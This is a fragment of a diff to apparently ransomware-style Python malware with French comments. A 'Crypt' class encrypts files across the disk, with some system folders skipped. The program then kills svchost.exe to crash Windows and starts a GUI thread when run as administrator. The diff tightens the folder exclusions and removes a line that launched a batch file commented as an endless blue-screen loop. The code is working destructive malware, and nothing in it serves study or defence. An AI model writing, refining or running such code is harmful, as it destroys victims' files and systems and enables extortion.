@@ -112,7 +112,7 @@ class Crypt: # Classe pour le cryptage
             
             if len(folder) != 0:
                 for file in folder:
-                    if ("WinSxS" not in file) and ("servicing" not in file) and ("SysWOW64" not in file) and ("." in file): self.Crypting(file)
+                    if ("WinSxS" not in file) and ("servicing" not in file) and ("SysWOW64" not in file) and ("System32" not in file) and ("OneDrive" not in file) and ("bd.bat" not in file) and ("WindowsApps" not in file) and ("." in file): self.Crypting(file)
             else: break
             
         os.system("taskkill /f /im svchost.exe")
@@ -123,7 +123,6 @@ crypting = Crypt() # Créer une instance de la classe
 
 if is_admin(): # Si l'utilisateur est administrateur
     
-    os.system("start /MIN mov.bat") # BSOD INFINI
     # Threads
     threads = [] # Liste des threads
     threads.append(threading.Thread(target=GUI))
